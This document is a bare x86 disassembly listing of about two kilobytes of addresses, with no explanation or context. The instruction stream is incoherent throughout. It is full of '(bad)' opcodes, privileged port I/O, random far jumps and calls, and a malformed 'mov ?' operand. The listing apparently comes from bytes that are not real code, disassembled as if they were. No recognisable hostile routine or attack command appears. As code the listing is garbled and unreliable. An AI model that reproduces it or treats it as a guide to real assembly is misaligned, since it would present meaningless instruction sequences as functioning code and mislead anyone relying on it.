  401fa9:	scas   al,BYTE PTR es:[edi]
  401faa:	repz xlat BYTE PTR ds:[ebx]
  401fac:	dec    ecx
  401fad:	mov    ebp,0x9e1c246e
  401fb2:	mov    al,ds:0x15af94c2
  401fb7:	add    BYTE PTR [ebx+0x59],bl
  401fba:	mov    cl,0x57
  401fbc:	add    BYTE PTR [edx],ah
  401fbe:	sub    eax,0xe7cc43e5
  401fc3:	mov    ebp,0xca0987a3
  401fc8:	and    al,0xff
  401fca:	pop    es
  401fcb:	sbb    eax,0xb2501b15
  401fd0:	mov    bl,0x78
  401fd2:	jecxz  0x401ff0
  401fd4:	int3   
  401fd5:	outs   dx,DWORD PTR ds:[esi]
  401fd6:	jmp    0x401fa4
  401fd8:	mov    dh,0x9f
  401fda:	imul   ebp,DWORD PTR ds:0x4f5b62c7,0x6e08268c
  401fe4:	mov    ds:0xe8752c38,al
  401fe9:	pop    edi
  401fea:	inc    esp
  401fec:	popf   
  401fed:	in     eax,0x8b
  401fef:	push   edx
  401ff0:	cmp    al,bh
  401ff2:	cmc    
  401ff3:	in     eax,dx
  401ff4:	pop    ds
  401ff5:	(bad)  
  401ff6:	enter  0xad85,0xbc
  401ffa:	out    dx,eax
  401ffb:	add    al,0x2b
  401ffd:	jnp    0x401f8f
  401fff:	xchg   ebx,eax
  402000:	mov    dl,0xbc
  402002:	mov    esi,0x7152b814
  402007:	pop    ss
  402008:	enter  0xbf79,0x6a
  40200c:	std    
  40200d:	ret    0xef2a
  402010:	xchg   DWORD PTR [edi-0x78],edi
  402013:	mov    ds:0xf3ba719d,al
  402018:	iret   
  402019:	pushf  
  40201a:	or     al,0x16
  40201c:	xchg   ebp,eax
  40201d:	imul   esp,DWORD PTR [esi]
  402020:	sahf   
  402021:	dec    edx
  402022:	aad    0x52
  402024:	fsubp  st(1),st
  402026:	add    bh,BYTE PTR [eax+0x3c]
  402029:	jmp    0xf904:0xd99d5536
  402030:	xchg   esi,eax
  402031:	in     al,dx
  402032:	lods   al,BYTE PTR ds:[esi]
  402033:	mov    ebp,ecx
  402035:	pop    ss
  402036:	add    eax,0xc0db7ca7
  40203b:	icebp  
  40203c:	cmp    al,0x40
  40203e:	out    0xe6,al
  402040:	xlat   BYTE PTR ds:[ebx]
  402041:	rcr    DWORD PTR [ecx],cl
  402043:	push   cs
  402044:	dec    ebp
  402045:	lock mov esp,DWORD PTR [esi+eiz*4]
  402049:	xchg   ebp,eax
  40204a:	sub    al,0x97
  40204c:	sbb    DWORD PTR [ecx],ebx
  40204e:	mov    al,0x2d
  402050:	inc    ecx
  402051:	pusha  
  402052:	icebp  
  402053:	fsub   DWORD PTR [esi-0x10f34e4]
  402059:	or     DWORD PTR [ebp-0x7c],esi
  40205c:	push   esi
  40205d:	ins    DWORD PTR es:[edi],dx
  40205e:	mov    ch,0xc7
  402060:	pop    ss
  402061:	loop   0x402011
  402063:	and    edi,DWORD PTR [edx]
  402065:	out    dx,eax
  402066:	pop    es
  402067:	mov    BYTE PTR [edx-0x79774f50],cl
  40206d:	inc    esp
  40206e:	popf   
  40206f:	outs   dx,DWORD PTR ds:[esi]
  402071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402072:	rol    DWORD PTR [ebx+0xc],1
  402075:	mov    al,0x43
  402077:	sub    BYTE PTR [ecx+0x52],dh
  40207a:	mov    dh,0x78
  40207c:	pop    esi
  40207d:	push   cs
  40207e:	or     DWORD PTR [esi-0x1e58b150],edi
  402084:	adc    esi,ebp
  402086:	sbb    BYTE PTR [ecx+0x20],bh
  402089:	int3   
  40208a:	push   esp
  40208b:	(bad)  
  40208d:	retf   0xbf88
  402090:	cwde   
  402091:	mov    al,0xd1
  402093:	mov    ds:0xe4094d56,al
  402098:	ror    bl,1
  40209a:	mov    ch,0x62
  40209c:	jmp    0xcbd26eb6
  4020a1:	dec    edx
  4020a2:	xor    DWORD PTR [eax],ebp
  4020a4:	cmp    eax,0xbf03b4a0
  4020a9:	js     0x40203f
  4020ab:	pop    esi
  4020ac:	nop
  4020ad:	std    
  4020ae:	jns    0x402100
  4020b0:	add    bl,BYTE PTR [esi]
  4020b2:	cli    
  4020b3:	dec    esi
  4020b4:	mov    bh,ch
  4020b6:	add    BYTE PTR [edi+edi*2-0x5f],bh
  4020ba:	mov    dh,cl
  4020bc:	pop    ss
  4020bd:	inc    ebp
  4020be:	das    
  4020bf:	sbb    al,0x33
  4020c1:	add    eax,0xa34052d4
  4020c6:	jmp    0x6240e6ba
  4020cb:	test   BYTE PTR [si-0x451e],dl
  4020d0:	(bad)  
  4020d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d2:	repz pop ss
  4020d4:	xchg   esi,eax
  4020d5:	push   esp
  4020d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d7:	or     eax,0xe8838c2d
  4020dc:	sub    al,0x51
  4020de:	aaa    
  4020df:	inc    edx
  4020e0:	outs   dx,BYTE PTR ds:[esi]
  4020e1:	pop    ebx
  4020e2:	test   BYTE PTR [ebp-0x585bb1a6],0x5b
  4020e9:	loopne 0x4020fc
  4020eb:	test   eax,0x31005784
  4020f0:	xchg   ecx,eax
  4020f1:	shl    BYTE PTR [ebp+0x1db6762c],cl
  4020f7:	dec    ecx
  4020f8:	shl    ah,0x9f
  4020fb:	and    al,ah
  4020fd:	or     eax,0xc5b50715
  402102:	jge    0x40210b
  402104:	ret    
  402105:	rcl    BYTE PTR [eax+0x56],cl
  402108:	and    DWORD PTR [ecx+0x7a],esp
  40210b:	fadd   DWORD PTR [edx+0x3a]
  40210e:	sub    DWORD PTR [esp+edi*8-0x77],esp
  402112:	dec    eax
  402113:	push   ss
  402114:	fldcw  WORD PTR [esi+0x2f]
  402117:	mov    gs,WORD PTR cs:[edi]
  40211a:	aam    0x22
  40211c:	mov    edi,0x6cd03e53
  402121:	leave  
  402122:	scas   al,BYTE PTR es:[edi]
  402123:	dec    edx
  402124:	and    eax,0x8c1dff3a
  402129:	add    DWORD PTR [ecx+esi*4+0x4f087dc4],ebp
  402130:	mov    cs,WORD PTR [ebx]
  402132:	lods   eax,DWORD PTR ds:[esi]
  402133:	adc    bl,BYTE PTR [edx+0x9]
  402136:	int3   
  402137:	les    edx,FWORD PTR [esi+0x4821b829]
  40213d:	pop    edx
  40213e:	jmp    ebp
  402140:	icebp  
  402141:	cli    
  402142:	pushf  
  402143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402144:	mov    edx,0x3dc98413
  402149:	mov    ss:0xd5bbbe9c,eax
  40214f:	mov    DWORD PTR [esi-0x79ea2f79],ebp
  402155:	add    esi,ebx
  402157:	xchg   ebp,eax
  402158:	xchg   ecx,eax
  402159:	stc    
  40215a:	cmp    ebp,DWORD PTR [edi]
  40215c:	into   
  40215d:	lods   al,BYTE PTR ds:[esi]
  40215e:	and    ah,dl
  402160:	push   DWORD PTR [eax+esi*4+0x2ea5a4eb]
  402167:	ins    BYTE PTR es:[edi],dx
  402168:	or     al,0x81
  40216a:	lods   eax,DWORD PTR ds:[esi]
  40216b:	repz cld 
  40216d:	jns    0x40210e
  40216f:	push   ecx
  402170:	fwait
  402171:	add    ebp,esi
  402173:	loope  0x402101
  402175:	stc    
  402176:	out    0xf3,eax
  402178:	out    dx,eax
  402179:	or     DWORD PTR [eax+0x20],edx
  40217c:	aas    
  40217d:	ss es mov bl,0xb6
  402181:	aas    
  402182:	jo     0x402144
  402184:	xchg   ebp,eax
  402185:	cdq    
  402186:	cmp    al,0x65
  402188:	push   0x31cbe2c
  40218d:	test   al,0x7e
  40218f:	aaa    
  402190:	push   esi
  402191:	repz (bad) 
  402193:	adc    eax,0xd76d8c5e
  402198:	pop    esp
  402199:	(bad)  
  40219a:	jmp    0xe48cd7d0
  40219f:	inc    esi
  4021a0:	sbb    BYTE PTR [edx+0x3fc4db1],dh
  4021a6:	adc    al,BYTE PTR [eax+0x57]
  4021a9:	ror    ecx,0x7b
  4021ac:	mov    cl,0x61
  4021ae:	inc    edi
  4021af:	lock push 0xc79ccacc
  4021b5:	inc    ebp
  4021b6:	gs ds dec esi
  4021b9:	idiv   esp
  4021bb:	dec    edx
  4021bc:	dec    esp
  4021bd:	std    
  4021be:	out    0x77,al
  4021c0:	mov    ebp,DWORD PTR [ebp-0x75]
  4021c3:	fucomip st,st(2)
  4021c5:	repz inc esp
  4021c7:	pop    ds
  4021c8:	repz jmp FWORD PTR [esi+0x7]
  4021cc:	add    DWORD PTR [ebx+0x9],ecx
  4021cf:	fs ffree st(0)
  4021d2:	sti    
  4021d3:	lahf   
  4021d4:	stos   BYTE PTR es:[edi],al
  4021d5:	dec    ebx
  4021d6:	and    BYTE PTR [ebp+0x3b],0xea
  4021da:	inc    ebx
  4021db:	xor    DWORD PTR [edi],edx
  4021dd:	out    0xe2,eax
  4021df:	(bad)  
  4021e0:	sbb    eax,0x36403afa
  4021e5:	cmp    al,0x79
  4021e7:	js     0x402194
  4021e9:	cmp    ebp,DWORD PTR [ebp+0x501ec88f]
  4021ef:	(bad)  
  4021f0:	aam    0x9a
  4021f2:	frstor [esi-0x42503c7]
  4021f8:	jae    0x4021b6
  4021fa:	retf   
  4021fb:	std    
  4021fc:	iret   
  4021fd:	and    DWORD PTR [esi+edx*1],ebx
  402200:	ds xor al,0x10
  402203:	add    al,0xe4
  402205:	and    BYTE PTR [bx+0x9],ch
  402209:	mov    bh,0x48
  40220b:	pop    edx
  40220c:	fisubr WORD PTR ds:0x14e6aeaa
  402212:	inc    ecx
  402213:	out    dx,al
  402214:	in     eax,dx
  402215:	hlt    
  402216:	pop    ss
  402217:	ds adc eax,0xd3482aed
  40221d:	inc    ecx
  40221e:	pop    esp
  40221f:	mov    al,0x43
  402221:	mov    WORD PTR [ebx],ss
  402223:	cld    
  402224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402225:	cdq    
  402226:	add    DWORD PTR [esi+ebp*2-0x61d7f975],esi
  40222d:	jns    0x402265
  40222f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402230:	dec    edx
  402231:	clc    
  402232:	push   0x2ea6369a
  402237:	jmp    0x4021d6
  402239:	mov    esp,0xca44cba9
  40223e:	sub    al,0x50
  402240:	mov    dl,BYTE PTR [edx+eax*1]
  402243:	pop    edx
  402244:	dec    edi
  402245:	sahf   
  402246:	sub    ecx,DWORD PTR [edx+0x3e]
  402249:	scas   eax,DWORD PTR es:[edi]
  40224a:	jnp    0x402298
  40224c:	mov    bl,0x59
  40224e:	dec    ebx
  40224f:	and    BYTE PTR [edi+0x44],cl
  402252:	sbb    esi,eax
  402254:	or     al,BYTE PTR [edx]
  402256:	xor    ah,dh
  402258:	(bad)  
  402259:	mov    DWORD PTR [ecx+esi*2-0x770cb7b4],ecx
  402260:	out    0x91,eax
  402262:	mov    ds:0x2da3fe56,eax
  402267:	jns    0x402244
  402269:	push   es
  40226a:	mov    esi,0x747429e9
  40226f:	imul   ebx,DWORD PTR [esi-0x6ab40672],0xb82355ac
  402279:	push   ecx
  40227a:	imul   ecx,DWORD PTR [eax+esi*4+0x395a4ba1],0x55
  402282:	mov    dh,0x64
  402284:	test   DWORD PTR [ecx+0x2ad1657f],0xf529f88f
  40228e:	mov    edi,0x3f4cffab
  402293:	jmp    0xcde0:0x34a3924
  40229a:	cs (bad) 
  40229c:	lds    ecx,FWORD PTR [ebp+0x67c7f662]
  4022a2:	jl     0x4022c7
  4022a4:	nop
  4022a5:	inc    BYTE PTR [ebx+0x6d11ae9b]
  4022ab:	mov    ds:0x6e7a0295,al
  4022b0:	add    BYTE PTR [ebx+0x16e61595],dl
  4022b6:	mov    BYTE PTR [ecx+0x51],bl
  4022b9:	fdiv   DWORD PTR [edx+0x6d10d1f3]
  4022bf:	outs   dx,BYTE PTR ds:[esi]
  4022c0:	in     eax,0xd0
  4022c2:	sbb    DWORD PTR [ecx-0x50d32dd8],ecx
  4022c8:	popf   
  4022c9:	ret    
  4022ca:	in     al,0x7c
  4022cc:	mov    al,ds:0x4514ad35
  4022d1:	daa    
  4022d2:	int    0xb2
  4022d4:	jp     0x402307
  4022d6:	push   ds
  4022d7:	mov    ebp,DWORD PTR [edx-0x59]
  4022da:	es call 0x8812:0x6c781484
  4022e2:	mov    bl,0xff
  4022e4:	dec    BYTE PTR [edx+0x5ab1349b]
  4022ea:	loop   0x40232e
  4022ec:	arpl   WORD PTR [eax+0xfce9772],ax
  4022f2:	inc    eax
  4022f3:	dec    esp
  4022f4:	pop    eax
  4022f5:	pop    eax
  4022f6:	pop    eax
  4022f7:	call   0x2d41:0x8bd20224
  4022fe:	fbstp  TBYTE PTR [edx+0x62]
  402301:	inc    ebp
  402302:	loope  0x4022cd
  402304:	lock adc eax,DWORD PTR [edx+esi*8]
  402308:	test   BYTE PTR [ebx+ebx*1-0x7428b73e],bh
  40230f:	mov    esi,0x81239949
  402314:	and    eax,0x3a735e4b
  402319:	mov    DWORD PTR [eax+ebx*8],ebx
  40231c:	adc    al,BYTE PTR [ebx+0x6c]
  40231f:	lahf   
  402320:	sti    
  402321:	push   0x77
  402323:	and    eax,0xde63bb72
  402328:	add    DWORD PTR [edi+0x1af83616],eax
  40232e:	lahf   
  40232f:	cmp    BYTE PTR [ebx+0x7c],bl
  402332:	sub    eax,0xaf97897
  402337:	(bad)  
  402338:	or     eax,0x8c1d77cf
  40233d:	jmp    0x4d7c8e9d
  402342:	lock xrelease xor DWORD PTR [ebp+0x12],edi
  402347:	inc    ebx
  402348:	fwait
  402349:	imul   esi,ecx,0xb3ade0f7
  40234f:	cmp    DWORD PTR [edx+eiz*2-0x4d],ecx
  402353:	cmp    al,0xbc
  402355:	jmp    0x40235f
  402357:	aaa    
  402358:	pushf  
  402359:	pusha  
  40235a:	jb     0x4023af
  40235c:	das    
  40235d:	add    edx,DWORD PTR [ebx+0x52]
  402360:	nop
  402361:	pop    ecx
  402362:	and    edi,esp
  402364:	jecxz  0x4023d6
  402366:	jl     0x4022fe
  402368:	and    bh,BYTE PTR [edi]
  40236a:	add    eax,0xa678f010
  40236f:	jae    0x4023d0
  402371:	and    BYTE PTR [eax-0x77],dh
  402374:	adc    esi,edx
  402376:	push   ebp
  402377:	popa   
  402378:	push   es
  402379:	jle    0x40239a
  40237b:	pop    es
  40237c:	and    BYTE PTR [ecx-0x1c65f6f5],bl
  402382:	and    dl,cl
  402384:	inc    esp
  402385:	mov    al,ds:0x85dc0c58
  40238a:	in     eax,0x3e
  40238c:	push   edi
  40238d:	push   ebp
  40238e:	push   ss
  40238f:	ret    0xe6f7
  402392:	pusha  
  402393:	dec    ebp
  402394:	jecxz  0x402366
  402396:	sub    bh,BYTE PTR [esp+ecx*1]
  402399:	sub    ebx,DWORD PTR [ebp+0x3a]
  40239c:	fwait
  40239d:	sub    al,0xa5
  40239f:	mov    esi,0xe48855b4
  4023a4:	push   0xffffff94
  4023a6:	ret    0x96f7
  4023a9:	into   
  4023aa:	mov    ds:0x1df22d7d,al
  4023af:	js     0x4023ef
  4023b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023b2:	aas    
  4023b3:	in     eax,dx
  4023b4:	jne    0x4023f2
  4023b6:	and    eax,DWORD PTR [ebp-0x25fbaa6c]
  4023bc:	xor    dh,BYTE PTR [eax]
  4023be:	dec    ebp
  4023bf:	or     eax,0x79494c45
  4023c4:	not    BYTE PTR [edi-0x747eb858]
  4023ca:	mov    ds:0xbdbe0a12,al
  4023cf:	inc    edx
  4023d0:	ins    BYTE PTR es:[edi],dx
  4023d1:	in     al,dx
  4023d2:	fst    DWORD PTR [ebp-0x656bf3c8]
  4023d8:	jp     0x40244a
  4023da:	pop    ds
  4023db:	mov    dh,0x53
  4023dd:	fmul   DWORD PTR [edx]
  4023df:	mov    al,0xc8
  4023e1:	adc    BYTE PTR [ebx],0xc5
  4023e4:	adc    eax,eax
  4023e6:	or     eax,0xcb3c5041
  4023eb:	ret    
  4023ec:	mov    ds:0xdf2192b4,al
  4023f1:	cmc    
  4023f2:	adc    dl,dh
  4023f4:	retf   0x9f9f
  4023f7:	(bad)  
  4023f8:	repz or DWORD PTR [edx+edi*1+0x5a],edx
  4023fd:	imul   ebx,ebx,0xffffffea
  402400:	dec    edx
  402401:	inc    eax
  402402:	ret    0x1e7a
  402405:	leave  
  402406:	stos   DWORD PTR es:[edi],eax
  402407:	mov    esp,0xe9862ae6
  40240c:	scas   al,BYTE PTR es:[edi]
  40240d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40240e:	loopne 0x4023a4
  402410:	sub    al,0xdf
  402412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402413:	inc    ebp
  402414:	nop
  402415:	(bad)  
  402416:	xlat   BYTE PTR ds:[ebx]
  402417:	loopne 0x402472
  402419:	mov    esp,0x2c500f3
  40241e:	sub    ah,cl
  402420:	xor    al,0x17
  402422:	test   DWORD PTR [edx+0x6c],ebp
  402425:	mov    ch,0xea
  402427:	inc    edi
  402428:	mov    BYTE PTR ds:0x2d54c59e,bl
  40242e:	and    al,0x33
  402430:	dec    esi
  402431:	add    al,0xa5
  402433:	sbb    al,0xfe
  402435:	scas   eax,DWORD PTR es:[edi]
  402436:	push   ebp
  402437:	inc    BYTE PTR [ebx-0x214303be]
  40243d:	mov    cl,al
  40243f:	or     eax,0xd2abd0ef
  402444:	jnp    0x4023fc
  402446:	out    0x4,al
  402448:	add    DWORD PTR [ebx+0x1b],eax
  40244b:	mov    al,ds:0xa39591a6
  402450:	pop    edi
  402451:	jno    0x402490
  402453:	arpl   WORD PTR [esi+0x4ac42d16],ax
  402459:	(bad)  
  40245a:	xchg   esp,eax
  40245b:	(bad)  
  40245c:	lahf   
  40245d:	ffree  st(2)
  40245f:	sub    ah,0x6f
  402462:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  402464:	cmp    al,0xe7
  402466:	ror    cl,1
  402468:	rcl    BYTE PTR [ebx],cl
  40246a:	hlt    
  40246b:	mov    edi,0x837ac041
  402470:	sbb    DWORD PTR [ebx-0x1bc8e234],ebx
  402476:	and    eax,0x26c98078
  40247b:	sub    DWORD PTR [eax+0x5e7e45c9],ebx
  402481:	add    edi,DWORD PTR [ecx+0x5cfed89f]
  402487:	and    eax,esi
  402489:	push   ebp
  40248a:	int3   
  40248b:	shl    BYTE PTR [eax+0x64104de5],cl
  402491:	call   FWORD PTR [ebx+0x5d]
  402494:	cwde   
  402495:	fldcw  WORD PTR [edx+eiz*8+0x5ca40cd3]
  40249c:	mov    esp,0x5627e89e
  4024a1:	ss inc eax
  4024a3:	jl     0x4024a8
  4024a5:	push   ecx
  4024a6:	add    al,0xa5
  4024a8:	push   ds
  4024a9:	aas    
  4024aa:	jno    0x4024b8
  4024ac:	into   
  4024ad:	mov    edx,0xf94d1dd
  4024b2:	jl     0x40245f
  4024b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024b5:	or     dl,ah
  4024b7:	push   esi
  4024b8:	int    0x91
  4024ba:	jmp    0x40247e
  4024bc:	cmc    
  4024bd:	sub    edx,DWORD PTR [ebp+0x5e2a56a6]
  4024c3:	mov    esi,0xa863157d
  4024c8:	pop    ss
  4024c9:	lods   eax,DWORD PTR ds:[esi]
  4024ca:	dec    edx
  4024cb:	ret    
  4024cc:	clc    
  4024cd:	loop   0x4024b1
  4024cf:	jo     0x4024fd
  4024d1:	push   cs
  4024d2:	inc    esp
  4024d3:	sub    al,0x28
  4024d5:	icebp  
  4024d6:	int    0x31
  4024d8:	jne    0x40246b
  4024da:	inc    edi
  4024db:	sub    BYTE PTR [edi+0x4],dl
  4024de:	into   
  4024df:	or     cl,bh
  4024e1:	push   0x18
  4024e3:	xor    al,0xcd
  4024e5:	mov    edx,0x39dd134a
  4024ea:	mov    bl,0x71
  4024ec:	stc    
  4024ed:	scas   al,BYTE PTR es:[edi]
  4024ee:	stos   BYTE PTR es:[edi],al
  4024ef:	and    dh,dh
  4024f1:	sar    DWORD PTR [edx-0xe9f2f58],1
  4024f7:	push   es
  4024f8:	push   0x9a48a965
  4024fd:	xchg   edx,eax
  4024fe:	mov    eax,0x5e251915
  402503:	loop   0x40256f
  402505:	aad    0x35
  402507:	inc    esp
  402508:	call   edi
  40250a:	and    dl,BYTE PTR [ecx+ebx*8-0x78601fe9]
  402511:	pop    ecx
  402512:	mov    edi,0x8c373e57
  402517:	xchg   edi,eax
  402518:	mov    esi,DWORD PTR [eax+0x1dcd308]
  40251e:	inc    eax
  40251f:	shl    BYTE PTR [ebx-0x9158365],0x3e
  402526:	mov    ?,WORD PTR [eax+0x3]
  402529:	dec    ebx
  40252a:	inc    edi
  40252b:	jb     0x4024f1
  40252d:	pop    esp
  40252e:	push   ds
  40252f:	push   ss
  402530:	xchg   edi,eax
  402531:	and    al,0x6
  402533:	mov    al,ds:0x855a493a
  402538:	cmp    ah,BYTE PTR [edi]
  40253a:	sbb    al,0x1
  40253c:	sub    dl,BYTE PTR [ebx+0x24817247]
  402542:	fild   DWORD PTR [ecx+0x6b343ad4]
  402548:	jno    0x402518
  40254a:	retf   
  40254b:	push   ecx
  40254c:	inc    edx
  40254d:	ss aam 0xb6
  402550:	lods   al,BYTE PTR ds:[esi]
  402551:	cld    
  402552:	scas   al,BYTE PTR es:[edi]
  402553:	lods   al,BYTE PTR ds:[esi]
  402554:	adc    dl,BYTE PTR [ecx]
  402556:	cmc    
  402557:	test   eax,0x4f4fb433
  40255c:	(bad)  
  40255d:	sahf   
  40255e:	jg     0x40251b
  402560:	jns    0x4024e3
  402562:	js     0x402580
  402564:	dec    ecx
  402565:	call   0x6c48:0x4b5f9d37
  40256c:	mov    ds:0x2ca90739,eax
  402571:	out    dx,al
  402572:	jp     0x40254e
  402574:	jmp    0xf75472c3
  402579:	std    
  40257a:	adc    eax,DWORD PTR [ebp+0x65]
  40257d:	je     0x40254b
  40257f:	loop   0x4025c7
  402581:	out    0x92,al
  402583:	pop    ebp
  402584:	pop    edi
  402585:	mov    ebp,0x7f9952a9
  40258a:	push   0xffffffc1
  40258c:	pop    ecx
  40258d:	in     al,0x9d
  40258f:	mov    esi,0xef85bfd1
  402594:	push   0x5d06b5e0
  402599:	mov    eax,0x633574f5
  40259e:	dec    eax
  40259f:	stos   BYTE PTR es:[edi],al
  4025a0:	out    0x2b,eax
  4025a2:	add    edx,ecx
  4025a4:	jae    0x40259b
  4025a6:	lea    esi,[eax+0x47]
  4025a9:	mov    edx,0xd85a9591
  4025ae:	or     BYTE PTR [ebx+0x28],0x81
  4025b2:	xchg   esi,eax
  4025b3:	adc    edx,DWORD PTR [ebx]
  4025b5:	ins    BYTE PTR es:[edi],dx
  4025b6:	rol    BYTE PTR [ebx+0x57],cl
  4025b9:	ins    DWORD PTR es:[edi],dx
  4025ba:	aam    0xb8
  4025bc:	inc    ebp
  4025bd:	or     al,BYTE PTR [esi+0x69]
  4025c0:	sar    BYTE PTR [ecx+0x1d],1
  4025c3:	cmc    
  4025c4:	or     BYTE PTR [ebp+0x69],0xa4
  4025c8:	push   edx
  4025c9:	xor    ecx,DWORD PTR [eax+eiz*2]
  4025cc:	sbb    al,0xc4
  4025ce:	in     al,0x49
  4025d0:	sbb    ah,BYTE PTR [edx-0xdd2acfe]
  4025d6:	mov    bh,0xb4
  4025d8:	mov    edx,0x8b915702
  4025dd:	call   0xc812fb3f
  4025e2:	leave  
  4025e3:	aad    0x93
  4025e5:	jno    0x402606
  4025e7:	out    0x37,eax
  4025e9:	jmp    0x4025a9
  4025eb:	sub    bl,dl
  4025ed:	sahf   
  4025ee:	icebp  
  4025ef:	xchg   ebx,eax
  4025f0:	sbb    eax,0x672f9dfc
  4025f5:	mov    ds:0x8b01e85d,eax
  4025fa:	push   0x14
  4025fc:	mov    eax,ds:0x5921a746
  402601:	stos   DWORD PTR es:[edi],eax
  402602:	pop    ss
  402603:	xchg   esp,eax
  402604:	and    cl,BYTE PTR [ebp-0x6f1ebaf9]
  40260a:	or     bh,0x4f
  40260d:	out    dx,eax
  40260e:	adc    dl,bl
  402610:	inc    ecx
  402611:	push   0x6
  402613:	sub    ebx,DWORD PTR [edx]
  402615:	sbb    al,0xf3
  402617:	cdq    
  402618:	int3   
  402619:	jbe    0x402628
  40261b:	retf   0xbfff
  40261e:	inc    esi
  40261f:	adc    dl,BYTE PTR [edi]
  402621:	pushf  
  402622:	aad    0x2c
  402624:	in     al,dx
  402625:	sbb    al,0x71
  402627:	adc    eax,0xb934cdb9
  40262c:	push   edx
  40262d:	mov    cl,bl
  40262f:	pop    ecx
  402630:	adc    edx,edi
  402632:	sar    DWORD PTR [ebp+0x3e],cl
  402635:	mov    BYTE PTR [esi+0x562c0d6a],bh
  40263b:	clc    
  40263c:	test   DWORD PTR [ecx-0xe85802a],eax
  402642:	adc    ebp,ebx
  402644:	xor    DWORD PTR [edi],esp
  402646:	les    ecx,FWORD PTR [ebx]
  402648:	and    eax,0x8a1bbd71
  40264d:	inc    edx
  40264e:	fild   DWORD PTR [ebx+0x61]
  402651:	les    esp,FWORD PTR [esi+0x28]
  402654:	push   cs
  402655:	inc    ecx
  402656:	out    dx,al
  402657:	inc    ebp
  402658:	mov    bl,0xdf
  40265a:	test   al,0xe5
  40265c:	in     eax,dx
  40265d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40265e:	(bad)  [eax+0x75f90fc2]
  402664:	mov    eax,0x4bbf5c9a
  402669:	iret   
  40266a:	hlt    
  40266b:	(bad)
  40266e:	sub    ebx,DWORD PTR [edi]
  402670:	or     ch,BYTE PTR [esi+0x3a]
  402673:	push   eax
  402674:	push   DWORD PTR [eax]
  402676:	xchg   ecx,eax
  402677:	mov    bh,0x23
  402679:	mov    cl,0x7e
  40267b:	mov    al,0xac
  40267d:	mov    DWORD PTR [esi-0x5f482149],0x3102e89e
  402687:	mov    esp,0x68df58ca
  40268c:	loope  0x40270a
  40268e:	push   0xf
  402690:	jnp    0x402642
  402692:	imul   ecx,ebp,0xb284b15
  402698:	repz mov al,0xbc
  40269b:	xor    dl,BYTE PTR [esi-0x4743bea0]
  4026a1:	ins    DWORD PTR es:[edi],dx
  4026a2:	sub    BYTE PTR [edi+0x32df26f4],bh
  4026a8:	adc    ebp,DWORD PTR [ecx+0x36]
  4026ab:	fdivr  DWORD PTR [ebp+0x12f8cba8]
  4026b1:	or     BYTE PTR [eax+0x21],ah
  4026b4:	cmp    esp,DWORD PTR [eax+ebp*8+0x55]
  4026b8:	mov    ds:0x3283af22,eax
  4026bd:	sbb    DWORD PTR [edx+0x59efd9ce],ebp
  4026c3:	mov    esi,0x7c5b65de
  4026c8:	sub    bh,BYTE PTR [ecx-0x10]
  4026cb:	xor    BYTE PTR [esp+ebx*4-0x431c0432],0x58
  4026d3:	popf   
  4026d4:	or     edx,DWORD PTR [edx-0x29]
  4026d7:	(bad)  ds:0x75f12ab3
  4026dd:	outs   dx,BYTE PTR ds:[esi]
  4026de:	nop
  4026df:	jb     0x40275c
  4026e1:	push   es
  4026e2:	jge    0x40274b
  4026e4:	imul   esp,DWORD PTR [edx-0x50],0x1d967b16
  4026eb:	pusha  
  4026ec:	popa   
  4026ed:	mov    cl,0x2a
  4026ef:	and    al,0x2d
  4026f1:	mov    WORD PTR [eax+0x59f661ae],cs
  4026f7:	pusha  
  4026f8:	mov    ebx,DWORD PTR [eax-0x4a]
  4026fb:	jne    0x4026e6
  4026fd:	xor    esp,esi
  4026ff:	mov    al,0x70
  402701:	mov    ch,0xe9
  402703:	pop    ebx
  402704:	das    
  402705:	cld    
  402706:	fsubr  DWORD PTR [ebx]
  402708:	jnp    0x40268f
  40270a:	rcr    DWORD PTR [edi-0x7cc12655],0xda
  402711:	stc    
  402712:	setg   BYTE PTR [ecx+0x6dbad8d]
  402719:	jae    0x402716
  40271b:	push   esi
  40271c:	mov    ch,0xf0
  40271e:	and    al,0x84
  402720:	test   eax,0x716431c8
  402725:	add    al,0x5f
  402727:	adc    dh,BYTE PTR [edx-0x43]
  40272a:	sbb    ch,BYTE PTR [eax+0x460416e7]
  402730:	add    DWORD PTR [ecx],0x41
  402733:	inc    esi
  402734:	sar    BYTE PTR [ecx+0x11],1
  402737:	psraw  mm7,QWORD PTR ds:0xf6b6abc6
  40273e:	ret    0x88af
  402741:	or     DWORD PTR [edx+0x27df4ef5],ebp
  402747:	outs   dx,DWORD PTR ds:[esi]
  402748:	adc    al,ah
  40274a:	ret    0x3ece
  40274d:	mov    ebp,0x396406a
  402752:	inc    esp
  402753:	and    eax,0xeb800280
  402758:	xchg   edx,eax
  402759:	aaa    
  40275a:	outs   dx,BYTE PTR ds:[esi]
  40275b:	or     DWORD PTR [ebx+0x5bca89ac],0xba311629
  402765:	and    ebx,0xdc5fac93
  40276b:	mov    eax,eax
  40276d:	pop    esi
  40276e:	mov    ds:0x47d6d875,eax
  402773:	cmp    DWORD PTR [esi-0x20b934ac],edi
  402779:	add    esp,ebx
  40277b:	adc    eax,0xdeaa6e82
  402780:	sbb    DWORD PTR [edx-0x188830b7],ecx
  402786:	mov    ds:0x9693ab43,al
  40278b:	cmp    DWORD PTR [edi],0xc6a42781
  402791:	jne    0x4027f0
  402793:	mov    esp,DWORD PTR [ecx+0x23656906]
  402799:	push   edx
  40279a:	test   dl,cl
  40279c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40279d:	int3   
  40279e:	fsubrp st(1),st
  4027a0:	xor    eax,0xf5cbb042
  4027a5:	call   0x710a3288
  4027aa:	adc    DWORD PTR [esi+0x4688f0b0],0x5dee8fef
  4027b4:	sbb    esp,DWORD PTR [edi+0x421f390e]
  4027ba:	mov    dl,0xf2
  4027bc:	je     0x4027c7
